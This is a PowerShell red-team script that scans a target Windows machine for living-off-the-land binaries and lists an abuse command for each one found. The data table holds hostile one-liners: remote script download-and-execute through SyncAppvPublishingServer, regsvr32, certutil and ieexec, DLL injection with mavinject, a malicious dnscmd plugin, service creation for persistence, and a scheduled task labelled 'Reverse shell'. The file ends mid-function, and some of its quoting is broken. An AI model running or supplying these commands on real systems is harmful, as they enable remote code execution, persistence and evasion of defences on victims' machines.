Param([string] $OutFile)
function Find-LOLBAS{
<#
.SYNOPSIS
Script which can be used to find living off the land binaries and scripts on a target machine.

.DESCRIPTION
The script searches through known locations of Living off Land Binaries and Scripts
and identifies if they exist. In the case they do exist it will output the name of the binary or
script, the full path, and how to use it.

.PARAMETER Outfile
If specified output will be put into an outfile of this name

.NOTES
  Version:        1.0
  Author:         NotoriousRebel
  Creation Date:  6/29/19

.EXAMPLE
PS C:\> .\Find-LOLBAS.ps1
PS C:\> .\Find-LOLBAS.ps1 -Outfile "results.txt"
.LINK
https://github.com/LOLBAS-Project/LOLBAS
#>

Param(
    [Parameter(Mandatory = $False)]
    [string]
    $OutFile
)

function format_string([string]$line){
  return $line
}
function pretty_print([string] $line, [string] $manual){
   <#
    .SYNOPSIS
    A helper function that pretty prints the output from find_exes 

    .DESCRIPTION
    This function outputs the information returned from the find_exes function
    and outputs in an easy to understand format.

    .PARAMETER line
    String returned from find_exes function that contains what binary or scripts
    were found on system.

    .OUTPUTS
    Outputs information in an easy to read format. 

    #>
    $line -split "`r`n" | ForEach-Object {
      # Initialize a custom object whose properties will reflect 
      # the input line's tokens (column values).
      $obj = New-Object PSCustomObject
      # Add each whitespace-separated token as a property.
      $counter = 0
      foreach ($token in $_ -split ' xx ' -ne '') {   
        if (0 -eq $counter){
          $counter++
          Add-member -InputObject $obj -MemberType NoteProperty -Name "Name" -value $token -Force
  
        }
        elseif(1 -eq $counter){
          $counter++
          Add-member -InputObject $obj -MemberType NoteProperty -Name "Path" -value $token -Force 
        }
        else{
          $counter++
          Add-member -InputObject $obj -MemberType NoteProperty -Name "Command" -value $token -Force
        }
      }
      $obj
    } | Sort-Object -Property Name | Format-Table  -AutoSize -Wrap -Property Name,Path,Command 
    
    #Write-Host "Must verify manually " -ForegroundColor "Yellow"
   # Write-Host "`r`n"
    $manual -split "`r`n" | ForEach-Object {
      # Initialize a custom object whose properties will reflect 
      # the input line's tokens (column values).
      $obj = New-Object PSCustomObject
      # Add each whitespace-separated token as a property.
      $counter = 0
      foreach ($token in $_ -split ' xx ',3 -ne '') {   
        if (0 -eq $counter){
          $counter++
          $token = $token -replace '\s',''
          Add-member -InputObject $obj -MemberType NoteProperty -Name "Name" -value $token -Force
  
        }
        elseif(1 -eq $counter){
          $counter++
          Add-member -InputObject $obj -MemberType NoteProperty -Name "Path" -value $token -Force 
        }
        else{
          $counter++
          Add-member -InputObject $obj -MemberType NoteProperty -Name "Command" -value $token -Force
        }
      }
      $obj
    } | Sort-Object -Property Name | Format-Table  -AutoSize -Wrap -Property Name,Path,Command 
}

function pretty_print_file([string] $line, [string] $manual){
  <#
   .SYNOPSIS
   A helper function that pretty prints the output from find_exes 

   .DESCRIPTION
   This function outputs the information returned from the find_exes function
   and outputs in an easy to understand format.

   .PARAMETER line
   String returned from find_exes function that contains what binary or scripts
   were found on system.

   .PARAMETER filename
   If exists indicates user wants to output information to a file

   .OUTPUTS
   Outputs information in an easy to read format. 

   #>
  
   $line -split "`r`n" | ForEach-Object {
    # Initialize a custom object whose properties will reflect 
    # the input line's tokens (column values).
    $obj = New-Object PSCustomObject
    # Add each whitespace-separated token as a property.
    $counter = 0
    foreach ($token in $_ -split ' xx ' -ne '') {   
      if (0 -eq $counter){
        $counter++
        Add-member -InputObject $obj -MemberType NoteProperty -Name "Name" -value $token -Force

      }
      elseif(1 -eq $counter){
        $counter++
        Add-member -InputObject $obj -MemberType NoteProperty -Name "Path" -value $token -Force 
      }
      else{
        $counter++
        Add-member -InputObject $obj -MemberType NoteProperty -Name "Command" -value $token -Force
      }
    }
    $obj
  } | Sort-Object -Property Name | Format-Table  -AutoSize -Wrap -Property Name,Path,Command | Out-File $OutFile

  $manual -split "`r`n" | ForEach-Object {
    # Initialize a custom object whose properties will reflect 
    # the input line's tokens (column values).
    $obj = New-Object PSCustomObject
    # Add each whitespace-separated token as a property.
    $counter = 0
    foreach ($token in $_ -split ' xx ',3 -ne '') {   
      if (0 -eq $counter){
        $counter++
        Add-member -InputObject $obj -MemberType NoteProperty -Name "Name" -value $token -Force

      }
      elseif(1 -eq $counter){
        $counter++
        Add-member -InputObject $obj -MemberType NoteProperty -Name "Path" -value $token -Force 
      }
      else{
        $counter++
        Add-member -InputObject $obj -MemberType NoteProperty -Name "Command" -value $token -Force
      }
    }
    $obj
  } | Sort-Object -Property Name | Format-Table  -AutoSize -Wrap -Property Name,Path,Command | Add-Content $OutFile
}

function find_exes([Hashtable]$dict){
     <#
    .SYNOPSIS
    Itereates through hashtable keys and tests the path
    of each one, if found will concatenate to string and return it at end

    .DESCRIPTION
    This function itereates through hashtable keys and
    determines if the path exists if found will append the key to an array.
    After iterateing through keys will itereate through array and will concatenate 
    the hashtable value of that key which is an array that contains the name of the binary or script
    and an example command utilizing it. 

    .PARAMETER dict
    A hashtable that maps binary or script path to an array that contains the name of
    the binary or script and an example command utilizing it.

    .OUTPUTS
    String
    Returns a string that contains every executable found and an example command along with it

    #>
   
    $paths = @()
    $line = ""
    foreach($path in $dict.Keys){
       Try
       {         
         if(Test-Path -Path $path){
            $paths += $path
         }
       }
       Catch {
         Write-Host "An error occurred:"
         Write-Host $_
       }
    }

    $paths = $paths | Sort-Object
    
    foreach($path in $paths){
        $lst = $dict[$path]
        $line += $lst[0] + ' xx ' + $path + ' xx ' + $lst[1] + "`r`n"
        #$line += $lst[0] + ' ' + $path + ' ' + $lst[1] + "`r`n"
    }

    return $line
}


$localappdata = $env:LOCALAPPDATA
$dict = @{'C:\Windows\explorer.exe' = 'Explorer.exe', 'explorer.exe calc.exe';
 'C:\Windows\SysWOW64\explorer.exe' = 'Explorer.exe', 'explorer.exe calc.exe';  
 'C:\Windows\System32\netsh.exe' = 'Netsh.exe', 'netsh.exe trace start capture=yes filemode=append persistent=yes tracefile=\\server\share\file.etl IPv4.Address=!(<IPofRemoteFileShare>)';
 'C:\Windows\SysWOW64\netsh.exe' = 'Netsh.exe', 'netsh.exe trace start capture=yes filemode=append persistent=yes tracefile=\\server\share\file.etl IPv4.Address=!(<IPofRemoteFileShare>)';
 'C:\Windows\System32\nltest.exe' = 'Nltest.exe', 'nltest.exe /SERVER:192.168.1.10 /QUERY';
 'C:\Windows\System32\Openwith.exe' = 'Openwith.exe', 'OpenWith.exe /c C:\test.hta';
 'C:\Windows\SysWOW64\Openwith.exe' = 'Openwith.exe', 'OpenWith.exe /c C:\test.hta';
 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' = 'Powershell.exe', 'powershell -ep bypass - < C:\temp:ttt';
 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe' = 'Powershell.exe', 'powershell -ep bypass - < C:\temp:ttt';
 'C:\Windows\System32\Psr.exe' = 'Psr.exe', 'psr.exe /start /gui 0 /output C:\users\user\out.zip';
 'C:\Windows\SysWOW64\Psr.exe' = 'Psr.exe', 'psr.exe /start /gui 0 /output C:\users\user\out.zip';
 'C:\Windows\System32\Robocopy.exe' = 'Robocopy.exe', 'Robocopy.exe C:\SourceFolder C:\DestFolder';
 'C:\Windows\SysWOW64\Robocopy.exe' = 'Robocopy.exe', 'Robocopy.exe C:\SourceFolder C:\DestFolder';
 'C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe' = 'AcroRd32.exe', 'Replace "C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe" by your binary';
 'C:\Program Files\Avast Software\Avast\aswrundll\aswrundll.exe' = 'aswrundll.exe', 'C:\Program Files\Avast Software\Avast\aswrundll C:\Users\Public\Libraries\tempsys\module.dll';
 'C:\Program Files (x86)\Notepad++\updater\gpup.exe' = 'Gpup.exe', 'Gpup.exe -w whatever -e C:\Windows\System32\calc.exe';
 'C:\Program Files (x86)\IBM\Lotus\Notes\Notes.exe' = 'Nlnotes.exe', "NLNOTES.EXE /authenticate '=N:\Lotus\Notes\Data\notes.ini' -Command if((Get-ExecutionPolicy ) -ne AllSigned) { Set-ExecutionPolicy -Scope Process Bypass }';
 'C:\Program Files (x86)\IBM\Lotus\Notes\notes.exe' = 'Notes.exe', 'Notes.exe '=N:\Lotus\Notes\Data\notes.ini' -Command if((Get-ExecutionPolicy) -ne AllSigned) { Set-ExecutionPolicy -Scope Process Bypass }";
 'C:\Windows\System32\nvuDisp.exe' = 'Nvudisp.exe', 'Nvudisp.exe System calc.exe';
 'C:\Program Files (x86)\ROCCAT\ROCCAT Swarm\ROCCAT_Swarm.exe' = 'ROCCAT_Swarm.exe', 'Replace ROCCAT_Swarm_Monitor.exe with your binary.exe';
 'C:\OEM\Preload\utility\RunCmd_X64.exe' = 'RunCmd_X64.exe', 'RunCmd_X64 file.cmd /F';
 'C:\LJ-Ent-700-color-MFP-M775-Full-Solution-15315\Setup.exe' = 'Setup.exe', 'Run Setup.exe';
 'C:\Program Files (x86)\Citrix\ICA Client\Drivers64\Usbinst.exe' = 'Usbinst.exe', 'Usbinst.exe InstallHinfSection "DefaultInstall 128 C:\temp\calc.inf"';
 'C:\Program Files\Oracle\VirtualBox Guest Additions' = 'VBoxDrvInst.exe', 'VBoxDrvInst.exe driver executeinf C:\temp\calc.inf';
 'C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.EXE' = 'winword.exe', 'winword.exe /l dllfile.dll';
 'C:\python27amd64\Lib\site-packages\win32com\test\testxslt.js (Visual Studio Installation)' = 'testxlst.js', 'cscript testxlst.js C:\test\test.xml C:\test\test.xls C:\test\test.out';
 'C:\Windows\System32\Atbroker.exe' = 'Atbroker.exe', 'ATBroker.exe /start malware';
 'C:\Windows\SysWOW64\Atbroker.exe' = 'Atbroker.exe', 'ATBroker.exe /start malware';
 'C:\Windows\System32\bash.exe' = 'Bash.exe', 'bash.exe -c calc.exe';
 'C:\Windows\SysWOW64\bash.exe' = 'Bash.exe', 'bash.exe -c calc.exe';
 'C:\Windows\System32\bitsadmin.exe' = 'Bitsadmin.exe', 'bitsadmin /create 1 bitsadmin /addfile 1 C:\Windows\System32\cmd.exe C:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 C:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1';
 'C:\Windows\SysWOW64\bitsadmin.exe' = 'Bitsadmin.exe', 'bitsadmin /create 1 bitsadmin /addfile 1 C:\Windows\System32\cmd.exe C:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 C:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1';
 'C:\Windows\System32\certutil.exe' = 'Certutil.exe', 'certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe';
 'C:\Windows\SysWOW64\certutil.exe' = 'Certutil.exe', 'certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe';
 'C:\Windows\System32\cmd.exe' = 'Cmd.exe', 'cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > fakefile.doC:payload.bat';
 'C:\Windows\SysWOW64\cmd.exe' = 'Cmd.exe', 'cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > fakefile.doC:payload.bat';
 'C:\Windows\System32\cmdkey.exe' = 'Cmdkey.exe', 'cmdkey /list';
 'C:\Windows\SysWOW64\cmdkey.exe' = 'Cmdkey.exe', 'cmdkey /list';
 'C:\Windows\System32\cmstp.exe' = 'Cmstp.exe', 'cmstp.exe /ni /s C:\cmstp\CorpVPN.inf';
 'C:\Windows\SysWOW64\cmstp.exe' = 'Cmstp.exe', 'cmstp.exe /ni /s C:\cmstp\CorpVPN.inf';
 'C:\Windows\System32\control.exe' = 'Control.exe', 'control.exe C:\Windows\tasks\file.txt:evil.dll';
 'C:\Windows\SysWOW64\control.exe' = 'Control.exe', 'control.exe C:\Windows\tasks\file.txt:evil.dll';
 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe' = 'Csc.exe', 'csc.exe -out:My.exe File.cs';
 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe' = 'Csc.exe', 'csc.exe -out:My.exe File.cs';
 'C:\Windows\System32\cscript.exe' = 'Cscript.exe', 'cscript C:\ads\file.txt:script.vbs';
 'C:\Windows\SysWOW64\cscript.exe' = 'Cscript.exe', 'cscript C:\ads\file.txt:script.vbs';
 'C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe' = 'Dfsvc.exe', 'rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo';
 'C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe' = 'Dfsvc.exe', 'rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo';
 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe' = 'Dfsvc.exe', 'rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo';
 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Dfsvc.exe' = 'Dfsvc.exe', 'rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo';
 'C:\Windows\System32\diskshadow.exe' = 'Diskshadow.exe', 'diskshadow.exe /s C:\test\diskshadow.txt';
 'C:\Windows\SysWOW64\diskshadow.exe' = 'Diskshadow.exe', 'diskshadow.exe /s C:\test\diskshadow.txt';
 'C:\Windows\System32\Dnscmd.exe' = 'Dnscmd.exe', 'dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll';
 'C:\Windows\SysWOW64\Dnscmd.exe' = 'Dnscmd.exe', 'dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll';
 'C:\Windows\System32\esentutl.exe' = 'Esentutl.exe', 'esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o';
 'C:\Windows\SysWOW64\esentutl.exe' = 'Esentutl.exe', 'esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o';
 'C:\Windows\System32\eventvwr.exe' = 'Eventvwr.exe', 'eventvwr.exe';
 'C:\Windows\SysWOW64\eventvwr.exe' = 'Eventvwr.exe', 'eventvwr.exe';
 'C:\Windows\System32\Expand.exe' = 'Expand.exe', 'expand \\webdav\folder\file.bat C:\ADS\file.bat';
 'C:\Windows\SysWOW64\Expand.exe' = 'Expand.exe', 'expand \\webdav\folder\file.bat C:\ADS\file.bat';
 'C:\Program Files\Internet Explorer\Extexport.exe' = 'Extexport.exe', 'Extexport.exe C:\test foo bar';
 'C:\Program Files (x86)\Internet Explorer\Extexport.exe' = 'Extexport.exe', 'Extexport.exe C:\test foo bar';
 'C:\Windows\System32\extrac32.exe' = 'Extrac32.exe', 'extrac32 C:\ADS\procexp.cab C:\ADS\file.txt:procexp.exe';
 'C:\Windows\SysWOW64\extrac32.exe' = 'Extrac32.exe', 'extrac32 C:\ADS\procexp.cab C:\ADS\file.txt:procexp.exe';
 'C:\Windows\System32\findstr.exe' = 'Findstr.exe', 'findstr /V /L W3AllLov3DonaldTrump C:\ADS\file.exe > C:\ADS\file.txt:file.exe';
 'C:\Windows\SysWOW64\findstr.exe' = 'Findstr.exe', 'findstr /V /L W3AllLov3DonaldTrump C:\ADS\file.exe > C:\ADS\file.txt:file.exe';
 'C:\Windows\System32\forfiles.exe' = 'Forfiles.exe', 'forfiles /p C:\Windows\System32 /m notepad.exe /c calc.exe';
 'C:\Windows\SysWOW64\forfiles.exe' = 'Forfiles.exe', 'forfiles /p C:\Windows\System32 /m notepad.exe /c calc.exe';
 'C:\Windows\System32\ftp.exe' = 'Ftp.exe', 'echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt';
 'C:\Windows\SysWOW64\ftp.exe' = 'Ftp.exe', 'echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt';
 'C:\Windows\System32\gpscript.exe' = 'Gpscript.exe', 'Gpscript /logon';
 'C:\Windows\SysWOW64\gpscript.exe' = 'Gpscript.exe', 'Gpscript /logon';
 'C:\Windows\System32\hh.exe' = 'Hh.exe', 'HH.exe http://some.url/script.ps1';
 'C:\Windows\SysWOW64\hh.exe' = 'Hh.exe', 'HH.exe http://some.url/script.ps1';
 'C:\Windows\System32\ie4uinit.exe' = 'Ie4uinit.exe', 'ie4uinit.exe -BaseSettings';
 'C:\Windows\SysWOW64\ie4uinit.exe' = 'Ie4uinit.exe', 'ie4uinit.exe -BaseSettings';
 'C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe' = 'Ieexec.exe', 'ieexec.exe http://x.x.x.x:8080/bypass.exe';
 'C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe' = 'Ieexec.exe', 'ieexec.exe http://x.x.x.x:8080/bypass.exe';
 'C:\Windows\System32\Infdefaultinstall.exe' = 'Infdefaultinstall.exe', 'InfDefaultInstall.exe Infdefaultinstall.inf';
 'C:\Windows\SysWOW64\Infdefaultinstall.exe' = 'Infdefaultinstall.exe', 'InfDefaultInstall.exe Infdefaultinstall.inf';
 'C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe' = 'Installutil.exe', 'InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll';
 'C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe' = 'Installutil.exe', 'InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll';
 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe' = 'Installutil.exe', 'InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll';
 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe' = 'Installutil.exe', 'InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll';
 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\Jsc.exe' = 'Jsc.exe', 'jsc.exe scriptfile.js';
 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Jsc.exe' = 'Jsc.exe', 'jsc.exe scriptfile.js';
 'C:\Windows\Microsoft.NET\Framework\v2.0.50727\Jsc.exe' = 'Jsc.exe', 'jsc.exe scriptfile.js';
 'C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Jsc.exe' = 'Jsc.exe', 'jsc.exe scriptfile.js';
 'C:\Windows\System32\makecab.exe' = 'Makecab.exe', 'makecab C:\ADS\autoruns.exe C:\ADS\cabtest.txt:autoruns.cab';
 'C:\Windows\SysWOW64\makecab.exe' = 'Makecab.exe', 'makecab C:\ADS\autoruns.exe C:\ADS\cabtest.txt:autoruns.cab';
 'C:\Windows\System32\mavinject.exe' = 'Mavinject.exe', 'MavInject.exe 3110 /INJECTRUNNING C:\folder\evil.dll';
 'C:\Windows\SysWOW64\mavinject.exe' = 'Mavinject.exe', 'MavInject.exe 3110 /INJECTRUNNING C:\folder\evil.dll';
 'C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe' = 'Microsoft.Workflow.Compiler.exe', 'Microsoft.Workflow.Compiler.exe tests.xml results.xml';
 'C:\Windows\System32\mmc.exe' = 'Mmc.exe', 'mmc.exe -Embedding C:\path\to\test.msc';
 'C:\Windows\SysWOW64\mmc.exe' = 'Mmc.exe', 'mmc.exe -Embedding C:\path\to\test.msc';
 'C:\Windows\Microsoft.NET\Framework\v2.0.50727\Msbuild.exe' = 'Msbuild.exe', 'msbuild.exe pshell.xml';
 'C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Msbuild.exe' = 'Msbuild.exe', 'msbuild.exe pshell.xml';
 'C:\Windows\Microsoft.NET\Framework\v3.5\Msbuild.exe' = 'Msbuild.exe', 'msbuild.exe pshell.xml';
 'C:\Windows\Microsoft.NET\Framework64\v3.5\Msbuild.exe' = 'Msbuild.exe', 'msbuild.exe pshell.xml';
 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe' = 'Msbuild.exe', 'msbuild.exe pshell.xml';
 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Msbuild.exe' = 'Msbuild.exe', 'msbuild.exe pshell.xml';
 'C:\Windows\System32\msconfig.exe' = 'Msconfig.exe', 'Msconfig.exe -5';
 'C:\Windows\System32\Msdt.exe' = 'Msdt.exe', 'msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE';
 'C:\Windows\SysWOW64\Msdt.exe' = 'Msdt.exe', 'msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE';
 'C:\Windows\System32\mshta.exe' = 'Mshta.exe', 'mshta.exe evilfile.hta';
 'C:\Windows\SysWOW64\mshta.exe' = 'Mshta.exe', 'mshta.exe evilfile.hta';
 'C:\Windows\System32\msiexec.exe' = 'Msiexec.exe', 'msiexec /quiet /i cmd.msi';
 'C:\Windows\SysWOW64\msiexec.exe' = 'Msiexec.exe', 'msiexec /quiet /i cmd.msi';
 'C:\Windows\System32\odbcconf.exe' = 'Odbcconf.exe', 'odbcconf -f file.rsp';
 'C:\Windows\SysWOW64\odbcconf.exe' = 'Odbcconf.exe', 'odbcconf -f file.rsp';
 'C:\Windows\System32\pcalua.exe' = 'Pcalua.exe', 'pcalua.exe -a calc.exe';
 'C:\Windows\System32\pcwrun.exe' = 'Pcwrun.exe', 'Pcwrun.exe C:\temp\beacon.exe';
 'C:\Windows\System32\Presentationhost.exe' = 'Presentationhost.exe', 'Presentationhost.exe C:\temp\Evil.xbap';
 'C:\Windows\SysWOW64\Presentationhost.exe' = 'Presentationhost.exe', 'Presentationhost.exe C:\temp\Evil.xbap';
 'C:\Windows\System32\print.exe' = 'Print.exe', 'print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe';
 'C:\Windows\SysWOW64\print.exe' = 'Print.exe', 'print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe';
 'C:\Windows\System32\reg.exe' = 'Reg.exe', 'reg export HKLM\SOFTWARE\Microsoft\Evilreg C:\ads\file.txt:evilreg.reg';
 'C:\Windows\SysWOW64\reg.exe' = 'Reg.exe', 'reg export HKLM\SOFTWARE\Microsoft\Evilreg C:\ads\file.txt:evilreg.reg';
 'C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe' = 'Regasm.exe', 'regasm.exe AllTheThingsx64.dll';
 'C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe' = 'Regasm.exe', 'regasm.exe AllTheThingsx64.dll';
 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe' = 'Regasm.exe', 'regasm.exe AllTheThingsx64.dll';
 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319regasm.exe' = 'Regasm.exe', 'regasm.exe AllTheThingsx64.dll';
 'C:\Windows\System32\regedit.exe' = 'Regedit.exe', 'regedit /E C:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey';
 'C:\Windows\SysWOW64\regedit.exe' = 'Regedit.exe', 'regedit /E C:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey';
 'C:\Windows\System32\Register-cimprovider.exe' = 'Register-cimprovider.exe', "'Register-cimprovider -path 'C:\folder\evil.dll'";
 'C:\Windows\SysWOW64\Register-cimprovider.exe' = 'Register-cimprovider.exe', "'Register-cimprovider -path 'C:\folder\evil.dll'";
 'C:\Windows\System32\regsvcs.exe' = 'Regsvcs.exe', 'regsvcs.exe AllTheThingsx64.dll';
 'C:\Windows\SysWOW64\regsvcs.exe' = 'Regsvcs.exe', 'regsvcs.exe AllTheThingsx64.dll';
 'C:\Windows\System32\regsvr32.exe' = 'Regsvr32.exe', 'regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll';
 'C:\Windows\SysWOW64\regsvr32.exe' = 'Regsvr32.exe', 'regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll';
 'C:\Windows\System32\replace.exe' = 'Replace.exe', 'replace.exe C:\Source\File.cab C:\Destination /A';
 'C:\Windows\SysWOW64\replace.exe' = 'Replace.exe', 'replace.exe C:\Source\File.cab C:\Destination /A';
 'C:\Windows\System32\rpcping.exe' = 'Rpcping.exe', 'rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM';
 'C:\Windows\SysWOW64\rpcping.exe' = 'Rpcping.exe', 'rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM';
 'C:\Windows\System32\rundll32.exe' = 'Rundll32.exe', 'rundll32.exe AllTheThingsx64,EntryPoint';
 'C:\Windows\SysWOW64\rundll32.exe' = 'Rundll32.exe', 'rundll32.exe AllTheThingsx64,EntryPoint';
 'C:\Windows\System32\runonce.exe' = 'Runonce.exe', 'Runonce.exe /AlternateShellStartup';
 'C:\Windows\SysWOW64\runonce.exe' = 'Runonce.exe', 'Runonce.exe /AlternateShellStartup';
 'C:\Windows\WinSxS\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.15_none_c2df1bba78111118\Runscripthelper.exe' = 'Runscripthelper.exe', 'runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test';
 'C:\Windows\WinSxS\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.192_none_ad4699b571e00c4a\Runscripthelper.exe' = 'Runscripthelper.exe', 'runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test';
 'C:\Windows\System32\sc.exe' = 'Sc.exe', "'sc create evilservice binPath='\'C:\\ADS\\file.txt:cmd.exe\' /c echo works > \'C:\ADS\works.txt\' DisplayName= 'evilservice' start= auto\ & sc start evilservice'";
 'C:\Windows\SysWOW64\sc.exe' = 'Sc.exe', "'sc create evilservice binPath='\'C:\\ADS\\file.txt:cmd.exe\' /c echo works > \'C:\ADS\works.txt\' DisplayName= 'evilservice' start= auto\ & sc start evilservice'";
 'C:\Windows\System32\schtasks.exe' = 'Schtasks.exe', "'schtasks /create /sc minute /mo 1 /tn 'Reverse shell' /tr C:\some\directory\revshell.exe'";
 'C:\Windows\SysWOW64\schtasks.exe' = 'Schtasks.exe', "'schtasks /create /sc minute /mo 1 /tn 'Reverse shell' /tr C:\some\directory\revshell.exe'";
 'C:\Windows\System32\scriptrunner.exe' = 'Scriptrunner.exe', 'Scriptrunner.exe -appvscript calc.exe';
 'C:\Windows\SysWOW64\scriptrunner.exe' = 'Scriptrunner.exe', 'Scriptrunner.exe -appvscript calc.exe';
 'C:\Windows\System32\SyncAppvPublishingServer.exe' = 'SyncAppvPublishingServer.exe', "'SyncAppvPublishingServer.exe 'n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX'";
 'C:\Windows\SysWOW64\SyncAppvPublishingServer.exe' = 'SyncAppvPublishingServer.exe', "'SyncAppvPublishingServer.exe 'n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX'";
 'C:\Windows\System32\verclsid.exe' = 'Verclsid.exe', 'verclsid.exe /S /C {CLSID}';
 'C:\Windows\SysWOW64\verclsid.exe' = 'Verclsid.exe', 'verclsid.exe /S /C {CLSID}';
 'C:\Program Files\Windows Mail\wab.exe' = 'Wab.exe', 'wab.exe';
 'C:\Program Files (x86)\Windows Mail\wab.exe' = 'Wab.exe', 'wab.exe';
 'C:\Windows\System32\wbem\wmic.exe' = 'Wmic.exe', "'wmic.exe process call create 'C:\ads\file.txt:program.exe'";
 'C:\Windows\SysWOW64\wbem\wmic.exe' = 'Wmic.exe', "'wmic.exe process call create 'C:\ads\file.txt:program.exe'";
 'C:\Windows\System32\wscript.exe' = 'Wscript.exe', 'wscript C:\ads\file.txt:script.vbs';
 'C:\Windows\SysWOW64\wscript.exe' = 'Wscript.exe', 'wscript C:\ads\file.txt:script.vbs';
 'C:\Windows\System32\wsreset.exe' = 'Wsreset.exe', 'wsreset.exe';
 'C:\Windows\System32\xwizard.exe' = 'Xwizard.exe', 'xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}';
 'C:\Windows\SysWOW64\xwizard.exe' = 'Xwizard.exe', 'xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}';
 'C:\Windows\System32\advpack.dll' = 'Advpack.dll', 'rundll32.exe advpack.dll,LaunchINFSection C:\test.inf,DefaultInstall_SingleUser,1,';
 'C:\Windows\SysWOW64\advpack.dll' = 'Advpack.dll', 'rundll32.exe advpack.dll,LaunchINFSection C:\test.inf,DefaultInstall_SingleUser,1,';
 'C:\Windows\System32\ieadvpack.dll' = 'Ieadvpack.dll', 'rundll32.exe ieadvpack.dll,LaunchINFSection C:\test.inf,DefaultInstall_SingleUser,1,';
 'C:\Windows\SysWOW64\ieadvpack.dll' = 'Ieadvpack.dll', 'rundll32.exe ieadvpack.dll,LaunchINFSection C:\test.inf,DefaultInstall_SingleUser,1,';
 'C:\Windows\System32\ieframe.dll' = 'Ieaframe.dll', "'rundll32.exe ieframe.dll,OpenURL 'C:\test\calc.url'";
 'C:\Windows\SysWOW64\ieframe.dll' = 'Ieaframe.dll', "'rundll32.exe ieframe.dll,OpenURL 'C:\test\calc.url'";
 'C:\Windows\System32\mshtml.dll' = 'Mshtml.dll', "'rundll32.exe Mshtml.dll,PrintHTML 'C:\temp\calc.hta'";
 'C:\Windows\SysWOW64\mshtml.dll' = 'Mshtml.dll', "'rundll32.exe Mshtml.dll,PrintHTML 'C:\temp\calc.hta'";
